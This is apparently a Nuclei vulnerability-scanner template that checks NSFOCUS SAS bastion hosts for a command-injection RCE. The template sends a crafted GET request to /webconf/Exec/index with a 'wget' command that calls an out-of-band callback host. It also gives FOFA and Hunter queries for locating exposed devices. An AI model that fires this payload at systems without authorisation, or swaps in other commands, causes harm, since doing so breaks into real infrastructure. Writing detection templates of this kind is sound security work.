id: nsfocus-sas-rce-exec

info:
  name: 绿盟 nsfocus sas 堡垒机 - rce
  author: hufei
  severity: critical
  description: |
     绿盟 SAS堡垒机 Exec 远程命令执行漏洞
  reference:
    https://mp.weixin.qq.com/s/qHPo0noFTvJoEcor00qtDg
  metadata:
    max-request: 3
    fofa-query: title=="NSFOCUS&nbsp;SAS[H]"
    hunter-query: app.name="NSFOCUS 绿盟 SAS"
    verified: true
  tags: 2023,hw,绿盟-sas,nsfocus,sas,oob

variables:
  dns: "{{interactsh-url}}"
  cmd: "wget {{dns}}"

http:
  - raw:
      - |
        GET /webconf/Exec/index?cms={{cmd}} HTTP/1.1
        Host: {{Hostname}}


    matchers:
      - type: dsl
        dsl:
          - contains(interactsh_protocol, "dns")
        condition: and

